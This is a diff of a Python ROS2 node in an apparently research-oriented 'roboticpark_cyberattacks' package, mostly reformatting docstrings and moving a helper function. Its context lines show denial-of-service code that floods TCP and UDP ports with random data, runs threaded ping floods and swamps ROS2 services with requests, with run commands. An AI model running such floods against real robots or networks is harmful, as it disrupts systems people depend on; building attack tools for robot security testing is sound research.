@@ -5,7 +5,7 @@ from std_srvs.srv import Empty
 from rcl_interfaces.srv import GetParameters
 from ros2node.api import get_node_names
 from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
-from roboticpark_cyberattacks.utils import rslg
+from roboticpark_cyberattacks.utils import rslg, printargs
 from rcl_interfaces.srv import *
 import random, socket
 from ping3 import ping
@@ -21,25 +21,12 @@ class dosnode(Node):
         self.declare_parameter('dos_protocol', 'tcp')
         self.declare_parameter('dos_workers', '1000')
 
-def printargs(node):
-    """Prints every param present in the node and its values
-
-       Parameters
-       ----------
-       node: Node The node 
-    """
-    
-    for i in node.get_parameters_by_prefix(''):
-        pamname=i
-        pamvalue=node.get_parameter(i)._value
-        rslg(node,f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')
-
 def checkService(node):
     """Checks if the Node is available. Otherwise, it kills the execution.
 
-       Parameters
-       ----------
-       node: Node The node 
+       Parameters:
+           node: Node The node
+           
     """
     
     objectiveParam = node.get_parameter('dos_node_objective')._value
@@ -51,12 +38,12 @@ def checkService(node):
 def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
     """Launches garbage into selected ports via UDP. This functions organizes the process.
 
-       Parameters
-       ----------
-       node: Node, The node 
-       ipdest: String, The ip to attack to.
-       ports: List, A list of ports
-       socketObject: Socket, the needed socket 
+       Parameters:
+           node: Node, The node 
+           ipdest: String, The ip to attack to.
+           ports: List, A list of ports
+           socketObject: Socket, the needed socket
+
     """
     rslg(node,f'Udp ports {ports}')
     futures = []
@@ -72,12 +59,11 @@ def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
 def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
     """Launches garbage into selected ports  via UDP. This functions makes the actual work of sending garbage
 
-       Parameters
-       ----------
-       node: Node, The node 
-       ip: String, The ip to attack to.
-       port: String, the port which will be attacked.
-       socketObject: Socket, the needed socket 
+       Parameters:
+           node: Node, The node 
+           ip: String, The ip to attack to.
+           port: String, the port which will be attacked.
+           socketObject: Socket, the needed socket 
     """
     data = (str(random.getrandbits(4096))).encode()
     s = socket.socket(socket.AF_INET, socketObject)
@@ -88,12 +74,12 @@ def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
 def dosSendRandomGarbageTCP(ipdest,node,ports,socketObject):
     """Launches garbage into selected ports via TCP. This functions organizes the process.
 
-       Parameters
-       ----------
-       node: Node, The node 
-       ipdest: String, The ip to attack to.
-       ports: List, A list of ports
-       socketObject: Socket, the needed socket 
+       Parameters:
+           node: Node, The node 
+           ipdest: String, The ip to attack to.
+           ports: List, A list of ports
+           socketObject: Socket, the needed socket
+
     """
     rslg(node,f'Tcp ports {ports}')
     futures = []
@@ -104,12 +90,12 @@ def dosSendRandomGarbageTCP(ipdest,node,ports,socketObject):
 def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
     """Launches garbage into selected ports  via TCP. This functions makes the actual work of sending garbage
 
-       Parameters
-       ----------
-       node: Node, The node 
-       ip: String, The ip to attack to.
-       port: String, the port which will be attacked.
-       socketObject: Socket, the needed socket 
+       Parameters:
+           node: Node, The node 
+           ip: String, The ip to attack to.
+           port: String, the port which will be attacked.
+           socketObject: Socket, the needed socket
+
     """
     while True:
         try: 
@@ -125,10 +111,9 @@ def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
 def dosSendPing(ipdest,workers):
     """Launches a ping attack against the machine objective. This functions organizes the process.
 
-       Parameters
-       ----------
-       ipdest: String, The ip to attack to.
-       workers: The number of simultaneous attacks we are going to launch.
+       Parameters:
+           ipdest: String, The ip to attack to.
+           workers: The number of simultaneous attacks we are going to launch.
     """
     futures = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=int(workers)) as executor:
@@ -138,9 +123,8 @@ def dosSendPing(ipdest,workers):
 def dosSendPingAux(ip):
     """Launches a ping attack against the machine objective. This functions makes the actual work of sending ping
 
-       Parameters
-       ----------
-       ip: String, The ip to attack to.
+       Parameters:
+           ip: String, The ip to attack to.
 
     """
     while True:
@@ -152,12 +136,12 @@ def dosSendPingAux(ip):
 def dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,workers):
     """Launches an attack against ROS2 services. This functions organizes the process.
 
-       Parameters
-       ----------
-       mydosnode: Node, The node we use to orchestrate the attack
-       nodeObjectiveServer: String, the service we are goint to attack
-       nodeObjectiveType: String, the type of the service we are goint to attack
-       workers: The number of simultaneous attacks we are going to launch. 
+       Parameters:
+           mydosnode: Node, The node we use to orchestrate the attack
+           nodeObjectiveServer: String, the service we are goint to attack
+           nodeObjectiveType: String, the type of the service we are goint to attack
+           workers: The number of simultaneous attacks we are going to launch. 
+
     """
     moduleName, class_name = nodeObjectiveType.rsplit('/', 1)
     moduleName = moduleName.replace('/', '.')
@@ -179,10 +163,9 @@ def dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,workers):
 def dosFillServiceAux(sclient,request):
     """Launches an attack against ROS2 services. This functions makes the actual connection
 
-       Parameters
-       ----------
-       sclient: Client, this is the client connected to the objective node
-       request: Multiform. Can be any type of ROS2 request type 
+       Parameters:
+           sclient: Client, this is the client connected to the objective node
+           request: Multiform. Can be any type of ROS2 request type 
 
     """
     future = sclient.call_async(request)
@@ -203,14 +186,12 @@ def main():
     portrange = range(1, 65535)  # Scan ports
     portrangeudp = range(1, 1024)  # Scan ports
 
-    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter to get the ip
-    # TODO: Maybe I should try DDS with python to get the ip of a node.
     # How to invoke them
     # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ping.yaml 
     # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.tcp.yaml 
     # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.udp.yaml 
     # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ros2.fill.yaml 
-    # Launch files are also avialable.
+    # Launch files are also available.
 
     if ipobjectiveParam == 'Unset':
         checkService(mydosnode)
